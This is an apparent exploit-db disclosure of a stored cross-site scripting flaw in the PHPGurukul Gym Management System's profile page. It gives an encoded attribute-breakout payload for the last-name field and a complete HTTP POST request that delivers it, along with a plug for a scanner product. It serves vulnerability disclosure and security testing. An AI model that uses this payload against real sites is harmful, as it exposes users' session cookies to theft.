# GYM MS - GYM Management System - Cross Site Scripting (Stored)
- Vendor Homepage: https://phpgurukul.com/gym-management-system-using-php-and-mysql/
- Software Link: https://phpgurukul.com/projects/GYM-Management-System-using-PHP.zip
- Version: 1.0
- Last Update: 31 August 2022
- Tested On: Kali Linux 6.1.27-1kali1 (2023-05-12) x86_64 + XAMPP 7.4.30
- https://www.exploit-db.com/exploits/51777
- [Rapplex](https://rapplex.com)

## Proof of Concept
- 1: Create user, login and go to profile.php

- 2: Use payload x%22%20onmouseover%3Dalert%28document.cookie%29%20x%3D%22 in lname field.

- 3: When entering the profile.php page, document.cookie will be reflected every time.

**_NOTE:_** This vulnerability was detected while testing with **Rapplex - Web Application Security Scanner.**

## About Rapplex
Rapplex is a web applicaton security scanner that scans and reports vulnerabilities in websites.
Pentesters can use it as an automation tool for daily tasks but "Pentester Studio" will provide such a great addition as well in their manual assessments.
So, the software does not need separate development tools to discover different types of vulnerabilities or to develop existing engines. 
"Exploit" tools are available to take advantage of vulnerabilities such as SQL Injection, Code Injection, Fle Incluson.


## HTTP Request 
```
POST /gym/profile.php HTTP/1.1
Host: localhost
Content-Length: 129
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: PHPSESSID=76e2048c174c1a5d46e203df87672c25 #CHANGE
Connection: close

fname=test&lname=x%22%20onmouseover%3Dalert%28document.cookie%29%20x%3D%22&email=john%40test.com&mobile=1425635241&state=Delhi&city=New+Delhi&address=ABC+Street+XYZ+Colony&submit=Update
```
